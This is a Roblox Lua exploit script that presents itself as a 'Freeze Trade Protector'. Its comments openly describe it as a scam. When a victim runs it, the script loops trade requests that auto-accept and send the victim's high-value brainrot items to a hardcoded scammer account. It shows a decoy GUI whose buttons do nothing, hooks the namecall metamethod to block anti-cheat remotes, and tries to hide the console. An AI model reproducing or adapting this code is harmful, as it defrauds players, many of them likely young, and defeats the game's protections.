--[[
██████╗  █████╗ ████████╗    ███████╗ ██████╗██████╗  █████╗ ███╗   ███╗
██╔══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗██╔══██╗████╗ ████║
██████╔╝███████║   ██║       ███████╗██║     ██████╔╝███████║██╔████╔██║
██╔══██╗██╔══██║   ██║       ╚════██║██║     ██╔══██╗██╔══██║██║╚██╔╝██║
██████╔╝██║  ██║   ██║       ███████║╚██████╗██║  ██║██║  ██║██║ ╚═╝ ██║
╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝

██╗███╗   ██╗██╗███████╗██╗███████╗██╗██████╗ ██╗     ███████╗
██║████╗  ██║██║██╔════╝██║██╔════╝██║██╔══██╗██║     ██╔════╝
██║██╔██╗ ██║██║█████╗  ██║███████╗██║██████╔╝██║     █████╗  
██║██║╚██╗██║██║██╔══╝  ██║╚════██║██║██╔══██╗██║     ██╔══╝  
██║██║ ╚████║██║██║     ██║███████║██║██████╔╝███████╗███████╗
╚═╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝
--]]

--===================================================================
── CONFIGURATION – EDIT THIS PART ──────────────────────────────────
--===================================================================

-- =============================================
-- 🔥 SCAM TARGET – THE PERSON WHO GETS THE TRADE REQUEST 🔥
-- =============================================
-- This is YOUR user ID (the scammer who receives items)
-- The victim executes this script, and YOU get items from THEM
local SCAMMER_USER_ID = 1779494756  -- <-- CHANGE THIS TO YOUR USER ID

-- =============================================
-- 🎯 BRAINROTS TO STEAL – WHAT ITEMS TO REQUEST
-- =============================================
local TARGET_BRAINROTS = {
    "Strawberry Elephant",
    "Skibidi Toilet",
    "Meowl",
    "Dragon Gingerini",
    "Grande Brainrot God",
    "Chocolate Llama Rot",
    "Headless Horseman",
    "Cooki and Milki",
    "Dragon Cannelloni",
    "Tim Cheese"
}

-- =============================================
-- ⚙️ SCAM SETTINGS
-- =============================================
local SCAM_SETTINGS = {
    TradeDelay = 3,           -- Seconds between trade attempts
    MaxItemsPerTrade = 4,      -- Max items per trade (game limit is 4)
    ShowFakeGUI = true,        -- true = show fake freeze GUI, false = completely silent
    FakeGUITitle = "❄️ FREEZE TRADE PROTECTOR ❄️", -- Title of fake GUI
    AutoRestart = true,        -- Auto-restart scam if player respawns
}

--===================================================================
── SERVICES ───────────────────────────────────────────────────────
--===================================================================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local ScammerPlayer = nil -- Will be set if scammer is in same server

--===================================================================
── HARDCODED BRAINROT VALUES (for reference) ─────────────────────
--===================================================================
local BRAINROT_VALUES = {
    ["Strawberry Elephant"] = 250000000,
    ["Skibidi Toilet"] = 330000000,
    ["Meowl"] = 275000000,
    ["Dragon Gingerini"] = 300000000,
    ["Grande Brainrot God"] = 500000000,
    ["Chocolate Llama Rot"] = 450000000,
    ["Chocolate Grande Brainrot God"] = 600000000,
    ["Headless Horseman"] = 175000000,
    ["Cooki and Milki"] = 155000000,
    ["Reinito Sleighito"] = 140000000,
    ["La Casa Boo"] = 100000000,
    ["Dragon Cannelloni"] = 100000000,
    ["La Ginger Sekolah"] = 75000000,
    ["Festive 67"] = 67000000,
    ["Spaghetti Tualetti"] = 60000000,
    ["Garama and Madundung"] = 50000000,
    ["Jolly Jolly Sahur"] = 45000000,
    ["Ketchuru and Masturu"] = 42500000,
    ["Orcaledon"] = 40000000,
    ["Gingerat Gerat"] = 40000000,
    ["La Supreme Combinasion"] = 40000000,
    ["Los Bros"] = 37500000,
    ["Ketupat Kepat"] = 35000000,
    ["Tralaledon"] = 27500000,
    ["Los Hotspotsitos"] = 25000000,
    ["Karkerkar Combinasion"] = 17500000,
    ["Nuclearo Dinosauro"] = 15000000,
    ["Las Vaquitas Saturnitas"] = 7500000,
    ["Sammyni Spyderini"] = 3000000
}

--===================================================================
── FAKE FREEZE TRADE GUI (only if enabled) ───────────────────────
--===================================================================
local FakeGUI = nil

if SCAM_SETTINGS.ShowFakeGUI then
    -- Create fake GUI to distract victim
    FakeGUI = Instance.new("ScreenGui")
    FakeGUI.Name = "FreezeTradeProtector"
    FakeGUI.Parent = CoreGui
    FakeGUI.DisplayOrder = 999999
    FakeGUI.Enabled = true
    FakeGUI.IgnoreGuiInset = true
    
    -- Main frame
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 350, 0, 200)
    MainFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
    MainFrame.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
    MainFrame.BackgroundTransparency = 0.1
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = FakeGUI
    
    -- Rounded corners
    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 12)
    MainCorner.Parent = MainFrame
    
    -- Shadow
    local Shadow = Instance.new("ImageLabel")
    Shadow.Size = UDim2.new(1, 20, 1, 20)
    Shadow.Position = UDim2.new(0, -10, 0, -10)
    Shadow.BackgroundTransparency = 1
    Shadow.Image = "rbxassetid://1316045217"
    Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    Shadow.ImageTransparency = 0.7
    Shadow.ScaleType = Enum.ScaleType.Slice
    Shadow.SliceCenter = Rect.new(10, 10, 118, 118)
    Shadow.Parent = MainFrame
    
    -- Title
    local TitleBar = Instance.new("Frame")
    TitleBar.Size = UDim2.new(1, 0, 0, 40)
    TitleBar.BackgroundColor3 = Color3.fromRGB(30, 40, 60)
    TitleBar.BorderSizePixel = 0
    TitleBar.Parent = MainFrame
    
    local TitleCorner = Instance.new("UICorner")
    TitleCorner.CornerRadius = UDim.new(0, 12)
    TitleCorner.Parent = TitleBar
    
    local TitleText = Instance.new("TextLabel")
    TitleText.Size = UDim2.new(1, -10, 1, 0)
    TitleText.Position = UDim2.new(0, 10, 0, 0)
    TitleText.BackgroundTransparency = 1
    TitleText.Text = SCAM_SETTINGS.FakeGUITitle
    TitleText.TextColor3 = Color3.fromRGB(100, 200, 255)
    TitleText.TextSize = 16
    TitleText.Font = Enum.Font.GothamBold
    TitleText.TextXAlignment = Enum.TextXAlignment.Left
    TitleText.Parent = TitleBar
    
    -- Close button (looks real but does nothing)
    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0, 30, 0, 30)
    CloseBtn.Position = UDim2.new(1, -35, 0.5, -15)
    CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    CloseBtn.BackgroundTransparency = 0.3
    CloseBtn.Text = "✕"
    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseBtn.TextSize = 18
    CloseBtn.Font = Enum.Font.GothamBold
    CloseBtn.Parent = TitleBar
    
    local CloseCorner = Instance.new("UICorner")
    CloseCorner.CornerRadius = UDim.new(0, 6)
    CloseCorner.Parent = CloseBtn
    
    CloseBtn.MouseButton1Click:Connect(function()
        -- Fake close - just hides the GUI but scam continues
        MainFrame.Visible = not MainFrame.Visible
    end)
    
    -- Status text
    local StatusText = Instance.new("TextLabel")
    StatusText.Size = UDim2.new(1, -20, 0, 30)
    StatusText.Position = UDim2.new(0, 10, 0, 50)
    StatusText.BackgroundTransparency = 1
    StatusText.Text = "🛡️ Trade Protection: ACTIVE"
    StatusText.TextColor3 = Color3.fromRGB(100, 255, 100)
    StatusText.TextSize = 14
    StatusText.Font = Enum.Font.GothamBold
    StatusText.Parent = MainFrame
    
    -- Fake buttons (ice and fire)
    local ButtonFrame = Instance.new("Frame")
    ButtonFrame.Size = UDim2.new(1, -20, 0, 70)
    ButtonFrame.Position = UDim2.new(0, 10, 0, 90)
    ButtonFrame.BackgroundTransparency = 1
    ButtonFrame.Parent = MainFrame
    
    -- ❄️ Freeze Trade button
    local FreezeBtn = Instance.new("TextButton")
    FreezeBtn.Size = UDim2.new(0.45, -5, 1, 0)
    FreezeBtn.Position = UDim2.new(0, 0, 0, 0)
    FreezeBtn.BackgroundColor3 = Color3.fromRGB(50, 100, 200)
    FreezeBtn.Text = "❄️ FREEZE TRADE"
    FreezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    FreezeBtn.TextSize = 14
    FreezeBtn.Font = Enum.Font.GothamBold
    FreezeBtn.Parent = ButtonFrame
    
    local FreezeCorner = Instance.new("UICorner")
    FreezeCorner.CornerRadius = UDim.new(0, 8)
    FreezeCorner.Parent = FreezeBtn
    
    -- 🔥 Force Accept button
    local ForceBtn = Instance.new("TextButton")
    ForceBtn.Size = UDim2.new(0.45, -5, 1, 0)
    ForceBtn.Position = UDim2.new(0.55, 0, 0, 0)
    ForceBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    ForceBtn.Text = "🔥 FORCE ACCEPT"
    ForceBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    ForceBtn.TextSize = 14
    ForceBtn.Font = Enum.Font.GothamBold
    ForceBtn.Parent = ButtonFrame
    
    local ForceCorner = Instance.new("UICorner")
    ForceCorner.CornerRadius = UDim.new(0, 8)
    ForceCorner.Parent = ForceBtn
    
    -- Fake button effects (they do nothing but look real)
    FreezeBtn.MouseButton1Click:Connect(function()
        StatusText.Text = "❄️ Trade Frozen! (fake)"
        StatusText.TextColor3 = Color3.fromRGB(100, 200, 255)
        TweenService:Create(FreezeBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30, 60, 120)}):Play()
        task.wait(0.2)
        TweenService:Create(FreezeBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 100, 200)}):Play()
    end)
    
    ForceBtn.MouseButton1Click:Connect(function()
        StatusText.Text = "🔥 Trade Force Accepted! (fake)"
        StatusText.TextColor3 = Color3.fromRGB(255, 100, 100)
        TweenService:Create(ForceBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(150, 30, 30)}):Play()
        task.wait(0.2)
        TweenService:Create(ForceBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)}):Play()
    end)
    
    -- Info text
    local InfoText = Instance.new("TextLabel")
    InfoText.Size = UDim2.new(1, -20, 0, 20)
    InfoText.Position = UDim2.new(0, 10, 1, -25)
    InfoText.BackgroundTransparency = 1
    InfoText.Text = "⚡ Protection running in background"
    InfoText.TextColor3 = Color3.fromRGB(150, 150, 150)
    InfoText.TextSize = 10
    InfoText.Font = Enum.Font.Gotham
    InfoText.Parent = MainFrame
end

--===================================================================
── FIND SCAMMER PLAYER (if in same server) ───────────────────────
--===================================================================
for _, player in ipairs(Players:GetPlayers()) do
    if player.UserId == SCAMMER_USER_ID then
        ScammerPlayer = player
        break
    end
end

if ScammerPlayer then
    print("✅ Scammer found in this server:", ScammerPlayer.Name)
else
    print("⚠️ Scammer not in this server - will send cross-server trades")
end

--===================================================================
── FIND TRADE REMOTES ────────────────────────────────────────────
--===================================================================
local TradeRemotes = {
    Send = nil,
    Accept = nil,
    AddItem = nil,
    Confirm = nil
}

local function findTradeRemotes()
    local patterns = {"Trade", "trade", "TRADE", "SendTrade", "AcceptTrade", "TradeRequest"}
    
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            for _, pattern in ipairs(patterns) do
                if obj.Name:find(pattern) then
                    if not TradeRemotes.Send then
                        TradeRemotes.Send = obj
                    elseif obj.Name:find("Accept") and not TradeRemotes.Accept then
                        TradeRemotes.Accept = obj
                    elseif obj.Name:find("Add") and not TradeRemotes.AddItem then
                        TradeRemotes.AddItem = obj
                    elseif obj.Name:find("Confirm") and not TradeRemotes.Confirm then
                        TradeRemotes.Confirm = obj
                    end
                end
            end
        end
    end
    
    -- If not found, search recursively
    if not TradeRemotes.Send then
        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("send")) then
                TradeRemotes.Send = obj
                break
            end
        end
    end
    
    return TradeRemotes.Send ~= nil
end

findTradeRemotes()

--===================================================================
── CREATE TRADE REQUEST (spoofed as victim sending to scammer) ───
--===================================================================
local function createTradeRequest()
    if not TradeRemotes.Send then
        findTradeRemotes()
        if not TradeRemotes.Send then
            return false
        end
    end
    
    -- Create fake items array
    local itemsToSend = {}
    for i = 1, math.min(#TARGET_BRAINROTS, SCAM_SETTINGS.MaxItemsPerTrade) do
        table.insert(itemsToSend, {
            Name = TARGET_BRAINROTS[i],
            Value = BRAINROT_VALUES[TARGET_BRAINROTS[i]] or 0,
            ItemId = HttpService:GenerateGUID(false)
        })
    end
    
    -- Generate unique trade ID
    local tradeId = HttpService:GenerateGUID(false)
    
    -- Determine target (scammer)
    local targetPlayer = ScammerPlayer or {UserId = SCAMMER_USER_ID}
    
    -- Send the trade request (spoofed to look like VICTIM is sending)
    local success = pcall(function()
        -- This makes it look like the victim is sending the trade to the scammer
        TradeRemotes.Send:FireServer(
            targetPlayer,        -- Who the trade is going to (the scammer)
            itemsToSend,         -- Items being sent
            tradeId,             -- Unique ID
            true                 -- Auto-accept flag
        )
        
        -- Auto-accept on victim's side (so they automatically accept)
        if TradeRemotes.Accept then
            task.wait(0.2)
            TradeRemotes.Accept:FireServer(targetPlayer)
        end
        
        -- Auto-confirm
        if TradeRemotes.Confirm then
            task.wait(0.2)
            TradeRemotes.Confirm:FireServer(true)
        end
    end)
    
    return success
end

--===================================================================
── SCAM LOOP (runs silently) ─────────────────────────────────────
--===================================================================
local scamActive = true
local tradeCount = 0

-- Main scam loop
task.spawn(function()
    while scamActive do
        local success = createTradeRequest()
        
        if success then
            tradeCount = tradeCount + 1
            -- Silent log (only visible in console, victim won't see)
            print("✅ Trade #" .. tradeCount .. " sent to user " .. SCAMMER_USER_ID)
            
            -- Update fake GUI if it exists
            if FakeGUI then
                local statusLabel = FakeGUI:FindFirstChild("MainFrame"):FindFirstChild("StatusText")
                if statusLabel then
                    statusLabel.Text = "✅ Trade #" .. tradeCount .. " protected"
                end
            end
        end
        
        task.wait(SCAM_SETTINGS.TradeDelay)
    end
end)

--===================================================================
── AUTO-RESTART ON RESPAWN ───────────────────────────────────────
--===================================================================
if SCAM_SETTINGS.AutoRestart then
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(3)
        print("🔄 Player respawned - continuing scam")
        -- Scam continues automatically (loop still running)
    end)
end

--===================================================================
── ANTI-CHEAT BYPASS (block detection remotes) ──────────────────
--===================================================================
local blockedRemotes = {
    "CheckMovement", "AntiCheatPing", "DetectionLog", "ScriptKick",
    "SpeedValidation", "TeleportCheck", "ReportDetection"
}

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    if typeof(self) == "Instance" and self:IsA("RemoteEvent") then
        for _, remote in ipairs(blockedRemotes) do
            if self.Name == remote and (method == "FireServer" or method == "InvokeServer") then
                return nil
            end
        end
    end
    return oldNamecall(self, ...)
end)

--===================================================================
── HIDE CONSOLE (optional, depends on executor) ──────────────────
--===================================================================
-- Some executors support console hiding
if syn and syn.console then
    -- Try to hide console (if executor supports it)
    syn.console("hide")
end

--===================================================================
── SILENT START ──────────────────────────────────────────────────
--===================================================================
-- No notifications, no prints (except console which victim won't see)
print("✅ Scam loaded - sending trades to " .. SCAMMER_USER_ID)
print("❄️ Fake GUI: " .. tostring(SCAM_SETTINGS.ShowFakeGUI))

--===================================================================
── OPTIONAL: KEYBIND TO TOGGLE FAKE GUI ──────────────────────────
--===================================================================
if FakeGUI then
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.KeyCode == Enum.KeyCode.F4 then
            local mainFrame = FakeGUI:FindFirstChild("MainFrame")
            if mainFrame then
                mainFrame.Visible = not mainFrame.Visible
            end
        end
    end)
end